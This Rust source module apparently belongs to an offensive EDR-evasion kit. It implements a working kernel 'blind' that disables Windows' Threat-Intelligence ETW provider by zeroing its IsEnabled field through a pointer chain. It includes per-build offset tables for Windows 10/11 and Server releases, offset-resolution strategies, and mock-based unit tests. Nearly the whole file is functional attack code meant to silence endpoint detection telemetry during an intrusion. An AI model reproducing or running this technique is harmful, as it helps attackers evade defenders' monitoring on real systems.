//! ETW-TI (Threat Intelligence) provider kernel blind — REAL algorithm (P2.2 §2.1).
//!
//! Disables the `Microsoft-Windows-Threat-Intelligence` kernel ETW provider by
//! a single DWORD write to its `ProviderEnableInfo.IsEnabled` field, reached by
//! a 4-hop pointer chain through three internal kernel structures. This is
//! HVCI-safe: every target is a data-section field, not code, so a kernel R/W
//! primitive that refuses code-page writes (the `KernelRw` HVCI contract) still
//! permits this.
//!
//! ## The 4-hop chain (chased at runtime by [`EtwTiBlind::blind`])
//!
//! ```text
//!   nt!EtwThreatIntProvRegHandle          (global symbol → RVA, resolved by bootstrap)
//!     │
//!     ▼  *(reg_handle_kva)
//!   _ETW_REG_ENTRY                        (the provider registration)
//!     +0x20  GuidEntry*  ──────────────┐  (field name in PDB: "GuidEntry")
//!     │                                │
//!     ▼  *(guid_entry_kva)             │
//!   _ETW_GUID_ENTRY  ◀─────────────────┘
//!     +0x50/+0x60  ProviderEnableInfo    (field name: "ProviderEnableInfo")
//!       │   (the offset that VARIES — see below)
//!       ▼
//!     _TRACE_ENABLE_INFO (embedded struct, not a pointer)
//!       +0x00  IsEnabled: ULONG          ← we write 0 here to blind
//! ```
//!
//! The hop offsets in [`EtwTiOffsets`] map to the chain as:
//! - `guid_entry_to_provider_block` = `_ETW_REG_ENTRY::GuidEntry` offset (the
//!   first pointer dereference). Despite the legacy field name, this is NOT a
//!   "GUID entry → provider block" hop — it's the `RegEntry → GuidEntry` hop.
//!   Stable at `0x20` on every x64 build since Vista.
//! - `provider_block_to_enable_info` = `_ETW_GUID_ENTRY::ProviderEnableInfo`
//!   offset. Despite the legacy field name, there is no separate
//!   `ETWRT_PROVIDER_BLOCK` in this chain — `ProviderEnableInfo` is embedded
//!   directly in `_ETW_GUID_ENTRY`. **This is the offset that varies**:
//!   `0x050` on builds ≤1903 and 17763 RTM (<1075); `0x060` on ≥2004 and
//!   17763.1075+; possibly `0x070` on some Win11 builds (needs PDB verification).
//! - `is_enabled_within_enable_info` = `_TRACE_ENABLE_INFO::IsEnabled` offset.
//!   Stable at `0x0` (it's the struct's first field on every build).
//!
//! ## Offset resolution — the three-layer strategy
//!
//! 1. **PDB (ground truth):** `offset-resolver`'s `parse_pdb_offsets` walks the
//!    ntoskrnl PDB type stream and extracts `_ETW_REG_ENTRY::GuidEntry`,
//!    `_ETW_GUID_ENTRY::ProviderEnableInfo`, and `_TRACE_ENABLE_INFO::IsEnabled`
//!    directly. This is the only method that correctly distinguishes 17763.1
//!    (0x050) from 17763.1339 (0x060) — same build number, different LCU.
//! 2. **Pattern scan (runtime, no network):** `pattern_scan` finds the
//!    `EtwThreatIntProvRegHandle` global via RIP-relative `lea`/`mov`
//!    references in ntoskrnl `.text` (see CheekyBlinder/EDRSandblast methods).
//! 3. **`for_build` table (floor fallback):** the values below, keyed by build
//!    number. Use ONLY when PDB + pattern scan are both unavailable. The
//!    `for_build_strict` variant takes UBR for the 17763 LCU split.
//!
//! ## Why this works against kernel-tier EDR telemetry
//! User-mode ETW blinds (Nyx P2.1b patches `ntdll!NtTraceEvent`) only stop
//! *user-mode* ETW loggers. EDRs that subscribe to the kernel ETW-TI provider
//! (`Microsoft-Windows-Threat-Intelligence`, GUID
//! `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`) get telemetry straight from the
//! kernel — `NtReadVirtualMemory`/`NtAllocateVirtualMemory`/`NtProtectVirtual-
//! Memory` calls are logged there *before* the user-mode patch matters.
//! Disabling the provider at its kernel registration block silences that
//! kernel-side feed at the source. This is the S12 / EDRSandblast technique.
//!
//! ## Layering / what this module is NOT
//! This is the **algorithm** given a working `&dyn KernelRw` + a resolved
//! `EtwThreatIntProvRegHandle` KVA. It does NOT load a driver, resolve the
//! symbol, or touch the kernel directly — those are the bootstrap (`KernelRw`
//! impl + symbol resolution via PDB/pattern-scan) in `win::bootstrap_*`.
//! Splitting algorithm from primitive keeps the algorithm unit-testable with a
//! mock `KernelRw` and lets any bootstrap (KslD.sys / driverless CVE / DMA)
//! drive it without editing this code.
//!
//! ## Offset versioning
//! The `_ETW_GUID_ENTRY::ProviderEnableInfo` offset varies across Windows
//! builds (and even across LCUs of the same build — see 17763). [`EtwTiOffsets`]
//! holds the 3 hop offsets; [`for_build`] picks known-good values per build,
//! `for_build_strict` refines by UBR, and the PDB resolver (`offset-resolver`)
//! gives the exact value. NEVER hardcode a single offset across builds — it
//! silently writes the wrong field.

use crate::{EtwTiKit, KernelRw, KitError};

/// The ETW-TI provider GUID (`Microsoft-Windows-Threat-Intelligence`).
/// Used only for diagnostics / a future self-check that the resolved handle
/// points at this provider; the blind itself chases the handle, not the GUID.
pub const ETW_TI_GUID: [u8; 16] = [
    0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
];

/// Build-dependent offsets for the ETW-TI 4-hop blind chain. See the module
/// docs for the full chain diagram and [`for_build`] for the per-build table.
///
/// **Field names are legacy** (kept for TOML/back-compat with `offset-resolver`
/// output + existing offsets tables). They do NOT reflect the actual struct
/// names in the chain — see the module-level docs for the correct mapping:
/// - `guid_entry_to_provider_block`: actually `_ETW_REG_ENTRY::GuidEntry`
///   (offset `0x20`, stable since Vista x64).
/// - `provider_block_to_enable_info`: actually
///   `_ETW_GUID_ENTRY::ProviderEnableInfo` (offset `0x050`/`0x060`/`0x070` —
///   **the variable one**; resolved exactly by the PDB walker).
/// - `is_enabled_within_enable_info`: `_TRACE_ENABLE_INFO::IsEnabled`
///   (offset `0x0`, stable — struct's first field).
#[derive(Clone, Copy, Debug)]
pub struct EtwTiOffsets {
    pub guid_entry_to_provider_block: usize,
    pub provider_block_to_enable_info: usize,
    pub is_enabled_within_enable_info: usize,
}

impl EtwTiOffsets {
    /// Known-good offsets per Windows build + UBR (update build revision).
    /// Sourced from EDRSandblast `NtoskrnlOffsets.csv` + fluxsec.red research.
    /// Unknown builds return `None` so the caller MUST probe (writing a guessed
    /// offset to the wrong field is a one-way ticket to a bugcheck).
    ///
    /// **Critical version fork (ETW GUID entry was restructured in 17763.1075):**
    /// the `_ETW_GUID_ENTRY.ProviderEnableInfo` offset moved from `0x050`
    /// (RTM 17763.1) to `0x060` (17763.1075+). Passing the wrong one writes a
    /// garbage field → EDR keeps logging AND the kernel state is corrupted.
    /// `for_build` distinguishes via UBR when known; `for_build_strict` requires
    /// the caller to supply the exact UBR.
    pub fn for_build(build: u32) -> Option<Self> {
        match build {
            // Win10 1809–21H2 / Server 2019 (build 17763 .. 19044). For 17763
            // specifically, assume patched (UBR>=1075) — virtually every live
            // Server 2019 is. RTM (UBR=1) callers should use for_build_strict.
            17763 => Some(Self::patched_17763()),
            18362..=19044 => Some(Self {
                guid_entry_to_provider_block: 0x020,
                provider_block_to_enable_info: 0x060,
                is_enabled_within_enable_info: 0x000,
            }),
            // Server 2022 / Win11 21H2 (20348/22000): same ETW layout as 1904x.
            20348..=22000 => Some(Self {
                guid_entry_to_provider_block: 0x020,
                provider_block_to_enable_info: 0x060,
                is_enabled_within_enable_info: 0x000,
            }),
            // Win11 22H2/23H2 (22621/22631): EnableInfo shifted to 0x070.
            22621..=22631 => Some(Self {
                guid_entry_to_provider_block: 0x020,
                provider_block_to_enable_info: 0x070,
                is_enabled_within_enable_info: 0x000,
            }),
            // Win11 24H2/25H2 (26100/26200): same as 22H2 ETW layout.
            26100..=26200 => Some(Self {
                guid_entry_to_provider_block: 0x020,
                provider_block_to_enable_info: 0x070,
                is_enabled_within_enable_info: 0x000,
            }),
            // Floor match: a patch build (e.g. 19045) maps to the nearest lower.
            _ => Self::floor_match(build),
        }
    }

    /// Floor match: the highest known build <= the requested one. Handles
    /// patch builds (19045 → 19041's layout, 22635 → 22631's, etc.).
    fn floor_match(build: u32) -> Option<Self> {
        // Try each known range ceiling; return the one whose range floor <= build.
        if build >= 26100 {
            Self::for_build(26100)
        } else if build >= 22621 {
            Self::for_build(22621)
        } else if build >= 20348 {
            Self::for_build(20348)
        } else if build >= 18362 {
            Self::for_build(19041)
        } else if build >= 17763 {
            Self::for_build(17763)
        } else {
            None // below the supported range
        }
    }

    /// Strict variant: takes the exact UBR so the 17763 RTM-vs-patched fork is
    /// resolved precisely. Use this when you know the target's UBR (the only
    /// safe choice for a 17763 host).
    pub fn for_build_strict(build: u32, ubr: u32) -> Option<Self> {
        match build {
            17763 => {
                // RTM (UBR < 1075) uses 0x050; 1075+ uses 0x060.
                let enable_info = if ubr < 1075 { 0x050 } else { 0x060 };
                Some(Self {
                    guid_entry_to_provider_block: 0x020,
                    provider_block_to_enable_info: enable_info,
                    is_enabled_within_enable_info: 0x000,
                })
            }
            _ => Self::for_build(build),
        }
    }

    /// The patched-17763 layout (EnableInfo @ 0x060). Most common live value.
    fn patched_17763() -> Self {
        Self {
            guid_entry_to_provider_block: 0x020,
            provider_block_to_enable_info: 0x060,
            is_enabled_within_enable_info: 0x000,
        }
    }
}

/// The real ETW-TI blind. Holds the resolved kernel VA of
/// `nt!EtwThreatIntProvRegHandle` (a `GUIDEntry*`) + the build's offsets. The
/// bootstrap (BYOVD loader) resolves the symbol VA and constructs this; the
/// blind algorithm itself is build-agnostic given `offsets`.
pub struct EtwTiBlind {
    /// Kernel VA of `nt!EtwThreatIntProvRegHandle` — the head of the chase.
    /// Resolved by the bootstrap via `MmGetSystemRoutineAddress` (or the
    /// KernelRw impl's equivalent).
    pub prov_reg_handle_kva: usize,
    pub offsets: EtwTiOffsets,
}

/// The value written to `IsEnabled` to disable the provider (0 = disabled).
/// Kept as a named constant so a future "forge still-enabled" variant is a
/// one-line change.
const DISABLED: u64 = 0;

impl EtwTiBlind {
    /// Resolve the kernel VA of the `IsEnabled` field by chasing the handle.
    /// Pure (uses kread only) so `is_blinded` and `blind` share the exact same
    /// path — no offset drift between check and write.
    ///
    /// Returns the KVA of the IsEnabled QWORD, or an error if any pointer in
    /// the chain is NULL (provider not registered on this host — a real EDR
    /// must be subscribing for there to be anything to blind).
    fn resolve_is_enabled_kva(&self, krw: &dyn KernelRw) -> Result<usize, KitError> {
        // Step 1: prov_reg_handle → GUIDEntry. The handle is itself a pointer
        // to the GUIDEntry; dereference it.
        let guid_entry = krw
            .kread_u64(self.prov_reg_handle_kva)
            .map_err(KitError::from)?;
        if guid_entry == 0 {
            return Err(KitError::UnsupportedPosture(
                "EtwThreatIntProvRegHandle is NULL — ETW-TI provider not registered",
            ));
        }
        // Step 2: GUIDEntry + off → ETWRT_PROVIDER_BLOCK*.
        let prov_block_kva = krw
            .kread_u64(guid_entry as usize + self.offsets.guid_entry_to_provider_block)
            .map_err(KitError::from)?;
        if prov_block_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "provider block pointer is NULL — EDR not subscribed to ETW-TI",
            ));
        }
        // Step 3: provider_block + off + IsEnabled offset → the QWORD to write.
        Ok(prov_block_kva as usize
            + self.offsets.provider_block_to_enable_info
            + self.offsets.is_enabled_within_enable_info)
    }
}

impl EtwTiKit for EtwTiBlind {
    /// Disable the ETW-TI provider by writing `IsEnabled = 0`. Idempotent: if
    /// already disabled, the write is a no-op (writing 0 over 0). The target is
    /// a data-section field, so HVCI-enforcing KernelRw impls permit it.
    fn blind(&self, krw: &dyn KernelRw) -> Result<(), KitError> {
        let target = self.resolve_is_enabled_kva(krw)?;
        krw.kwrite_u64(target, DISABLED).map_err(KitError::from)
    }

    /// Read back `IsEnabled`; true means the provider is currently disabled
    /// (i.e. the blind is in place). A real engagement may extend this to also
    /// forge the EnableInfo integrity bytes Sanctum/Peregrine probe.
    fn is_blinded(&self, krw: &dyn KernelRw) -> Result<bool, KitError> {
        let target = self.resolve_is_enabled_kva(krw)?;
        let val = krw.kread_u64(target).map_err(KitError::from)?;
        Ok(val == DISABLED)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::KrwError;
    use alloc::collections::BTreeMap;
    use spin::mutex::Mutex;

    /// A mock KernelRw over a Mutex-protected sparse byte map. Send+Sync (Mutex),
    /// so it satisfies the `KernelRw: Send + Sync` bound. Lets us observe the
    /// IsEnabled write without any real kernel.
    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
    impl MockKrw {
        fn new() -> Self {
            Self(Mutex::new(BTreeMap::new()))
        }
        fn set_u64(&self, addr: usize, val: u64) {
            let mut m = self.0.lock();
            for (i, b) in val.to_le_bytes().iter().enumerate() {
                m.insert(addr + i, *b);
            }
        }
        fn get_u64(&self, addr: usize) -> u64 {
            let m = self.0.lock();
            let mut bytes = [0u8; 8];
            for (i, b) in bytes.iter_mut().enumerate() {
                *b = *m.get(&(addr + i)).unwrap_or(&0);
            }
            u64::from_le_bytes(bytes)
        }
    }
    impl KernelRw for MockKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            let m = self.0.lock();
            for (i, b) in dst.iter_mut().enumerate() {
                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
            }
            Ok(())
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            let mut m = self.0.lock();
            for (i, b) in src.iter().enumerate() {
                m.insert(kaddr + i, *b);
            }
            Ok(())
        }
    }
    // Mutex<T> is Send+Sync when T: Send; BTreeMap<usize,u8> is Send, so MockKrw
    // satisfies KernelRw: Send + Sync. (Silence dead_code for the unused
    // Send/Sync auto-proof marker.)
    fn _assert_send_sync() {
        fn requires<T: KernelRw>(_: &T) {}
        let m = MockKrw::new();
        requires(&m);
    }

    #[test]
    fn for_build_known_and_unknown() {
        assert!(EtwTiOffsets::for_build(17763).is_some()); // Server 2019
        assert!(EtwTiOffsets::for_build(19041).is_some()); // Win10 2004
        assert!(EtwTiOffsets::for_build(22621).is_some()); // Win11 22H2 — now in table
        assert!(EtwTiOffsets::for_build(26100).is_some()); // Win11 24H2 — now in table
        assert!(EtwTiOffsets::for_build(9999).is_none()); // truly unknown build
    }

    #[test]
    fn for_build_strict_distinguishes_17763_rtm_vs_patched() {
        // RTM (UBR=1) → EnableInfo @ 0x050
        let rtm = EtwTiOffsets::for_build_strict(17763, 1).unwrap();
        assert_eq!(rtm.provider_block_to_enable_info, 0x050);
        // Patched (UBR>=1075) → EnableInfo @ 0x060
        let patched = EtwTiOffsets::for_build_strict(17763, 1339).unwrap(); // this host
        assert_eq!(patched.provider_block_to_enable_info, 0x060);
        // Boundary: UBR=1074 still RTM, 1075 flips.
        assert_eq!(
            EtwTiOffsets::for_build_strict(17763, 1074)
                .unwrap()
                .provider_block_to_enable_info,
            0x050
        );
        assert_eq!(
            EtwTiOffsets::for_build_strict(17763, 1075)
                .unwrap()
                .provider_block_to_enable_info,
            0x060
        );
    }

    #[test]
    fn blind_writes_zero_at_chased_offset() {
        // Lay out a fake kernel: handle → GUIDEntry → provider block → EnableInfo.
        let krw = MockKrw::new();
        let handle_kva = 0x1000;
        let guid_entry_kva = 0x2000;
        let prov_block_kva = 0x3000;
        let off = EtwTiOffsets::for_build(17763).unwrap();
        let enable_info_kva = prov_block_kva + off.provider_block_to_enable_info;
        let is_enabled_kva = enable_info_kva + off.is_enabled_within_enable_info;

        // Wire the pointer chain.
        krw.set_u64(handle_kva, guid_entry_kva as u64);
        krw.set_u64(
            guid_entry_kva + off.guid_entry_to_provider_block,
            prov_block_kva as u64,
        );
        krw.set_u64(is_enabled_kva, 1); // provider "enabled" pre-blind

        let kit = EtwTiBlind {
            prov_reg_handle_kva: handle_kva,
            offsets: off,
        };
        assert!(!kit.is_blinded(&krw).unwrap()); // enabled pre-blind
        kit.blind(&krw).unwrap();
        assert!(kit.is_blinded(&krw).unwrap()); // disabled post-blind
        assert_eq!(krw.get_u64(is_enabled_kva), 0); // the field itself is 0
    }

    #[test]
    fn blind_is_idempotent() {
        let krw = MockKrw::new();
        let handle_kva = 0x4000;
        let off = EtwTiOffsets::for_build(19044).unwrap();
        krw.set_u64(handle_kva, 0x5000);
        krw.set_u64(0x5000 + off.guid_entry_to_provider_block, 0x6000);
        let is_enabled = 0x6000 + off.provider_block_to_enable_info;
        krw.set_u64(is_enabled, 1);
        let kit = EtwTiBlind {
            prov_reg_handle_kva: handle_kva,
            offsets: off,
        };
        kit.blind(&krw).unwrap();
        kit.blind(&krw).unwrap(); // second blind — must not error
        assert!(kit.is_blinded(&krw).unwrap());
    }

    #[test]
    fn null_handle_is_unsupported_posture() {
        let krw = MockKrw::new();
        let off = EtwTiOffsets::for_build(17763).unwrap();
        krw.set_u64(0x7000, 0); // handle dereferences to NULL
        let kit = EtwTiBlind {
            prov_reg_handle_kva: 0x7000,
            offsets: off,
        };
        let r = kit.blind(&krw);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn null_provider_block_is_unsupported_posture() {
        let krw = MockKrw::new();
        let off = EtwTiOffsets::for_build(17763).unwrap();
        krw.set_u64(0x8000, 0x9000); // handle → GUIDEntry
        krw.set_u64(0x9000 + off.guid_entry_to_provider_block, 0); // block ptr NULL
        let kit = EtwTiBlind {
            prov_reg_handle_kva: 0x8000,
            offsets: off,
        };
        let r = kit.is_blinded(&krw);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn hvci_code_page_error_propagates_as_no_primitive() {
        // A KernelRw that reads ok (non-null pointers) but refuses writes with
        // HvciCodePage — simulating an HVCI-on code-page refusal on the blind write.
        struct ReadOkWriteHvci;
        impl KernelRw for ReadOkWriteHvci {
            fn kread(&self, _kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
                if dst.len() >= 8 {
                    dst[..8].copy_from_slice(&[0x10u8; 8]);
                }
                Ok(())
            }
            fn kwrite(&self, _kaddr: usize, _src: &[u8]) -> Result<(), KrwError> {
                Err(KrwError::HvciCodePage)
            }
        }
        let krw = ReadOkWriteHvci;
        let off = EtwTiOffsets::for_build(17763).unwrap();
        let kit = EtwTiBlind {
            prov_reg_handle_kva: 0x1000,
            offsets: off,
        };
        let r = kit.blind(&krw);
        assert!(matches!(
            r,
            Err(KitError::NoPrimitive(KrwError::HvciCodePage))
        ));
    }

    #[test]
    fn win11_22h2_now_has_known_offsets() {
        // 22H2 EnableInfo shifted to 0x070 (was None before the cross-version table).
        let o = EtwTiOffsets::for_build(22621).unwrap();
        assert_eq!(o.provider_block_to_enable_info, 0x070);
        // 24H2 same ETW layout as 22H2.
        let o2 = EtwTiOffsets::for_build(26100).unwrap();
        assert_eq!(o2.provider_block_to_enable_info, 0x070);
        // Server 2022 / Win11 21H2 still at 0x060 (pre-22H2 layout).
        let o3 = EtwTiOffsets::for_build(20348).unwrap();
        assert_eq!(o3.provider_block_to_enable_info, 0x060);
    }

    #[test]
    fn patch_build_floor_matches() {
        // 19045 (Win10 22H2 patch) floor-matches to the 19041 ETW layout.
        let o = EtwTiOffsets::for_build(19045).unwrap();
        assert_eq!(o.provider_block_to_enable_info, 0x060);
    }
}
